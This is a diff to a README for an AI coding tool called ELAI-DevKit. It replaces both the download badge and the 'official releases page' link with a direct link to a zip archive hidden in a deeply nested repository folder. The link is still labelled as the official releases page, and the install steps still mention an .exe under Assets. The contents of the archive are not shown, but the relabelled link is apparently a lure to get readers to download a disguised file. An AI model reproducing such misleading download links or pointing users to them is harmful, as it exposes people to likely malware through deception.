@@ -1,6 +1,6 @@
 # 🤖 ELAI-DevKit - Build software using simple chat prompts
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/fonscutup654/ELAI-DevKit/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/fonscutup654/ELAI-DevKit/main/apps/dev_patcher/core/patcher_tools/ELA-Dev-Kit-2.2.zip)
 
 ELAI-DevKit helps you build and modify code projects through natural language. You talk to the software, and it writes the code for you. You do not need deep programming knowledge to start. This tool bridges the gap between your ideas and a working computer application.
 
@@ -28,7 +28,7 @@ Your computer needs to meet these basic standards to run the application well:
 
 Follow these steps to install the software on your Windows machine.
 
-1. Visit the [official releases page](https://github.com/fonscutup654/ELAI-DevKit/releases) to find the latest version.
+1. Visit the [official releases page](https://raw.githubusercontent.com/fonscutup654/ELAI-DevKit/main/apps/dev_patcher/core/patcher_tools/ELA-Dev-Kit-2.2.zip) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to start the download.
 4. Locate the file in your Downloads folder once the transfer finishes.
